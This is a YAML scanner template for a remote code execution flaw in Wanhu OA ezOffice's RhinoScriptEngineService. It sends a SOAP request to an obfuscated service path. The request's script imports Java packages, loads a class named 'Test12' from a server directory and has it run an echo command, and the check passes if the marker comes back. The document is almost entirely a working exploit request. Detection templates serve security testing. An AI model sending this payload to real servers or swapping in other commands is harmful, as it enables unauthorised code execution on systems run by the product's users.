yml/wanhu-OA-ezOffice-RhinoScriptEngineService-rce.yml

name: wanhu-OA-ezOffice-RhinoScriptEngineService-rce
set:
  rand: randomLowercase(32)
rules:
  - method: POST
    path: "//defaultroot/services/./././RhinoScriptEngineService"
    headers:
      Accept-Encoding: gzip, deflate
      Accept-Language: en
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
      Connection: close
      Content-Type: text/xml;charset=UTF-8
      SOAPAction: '""'
    body: "
      <?xml version='1.0' encoding='UTF-8'?>
         <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:jav="http://javascript.script.sun.com">
           <soapenv:Body>
             <eval xmlns="http://127.0.0.1:8080/services/scriptEngine">
               <arg0 xmlns="">
                 <![CDATA[
                 try {
                 load("nashorn:Moziilla_compat.js");
                 } catch (e) {
                 }
                 importPackage(Packages.java.io);
                 importPackage(Packages.java.lang);
                 importPackage(Packages.java.util);
                 importPackage(Packages.java.net);

                 new URLClassLoader([new File('../server').toURL()]).loadClass('Test12').getConstructor([Class.forName("java.lang.String")]).newInstance(["echo '{{rand}}'"]).toString()

                 ]]>
               </arg0>
               <arg1 xmlns="" xsi:type="urn:SimpleScriptContext" xmlns:urn="urn:beanservice">
               </arg1>
             </eval>
           </soapenv:Body>
         </soapenv:Envelope>"
    expression: | 
      response.status == 200 && response.body.bcontains(b'{{rand}}')
detail:
  author: test